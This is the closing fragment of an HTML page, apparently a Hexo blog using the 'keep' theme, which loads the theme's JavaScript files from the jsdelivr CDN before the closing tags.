<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>


<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
    
</div>



</body>
</html>
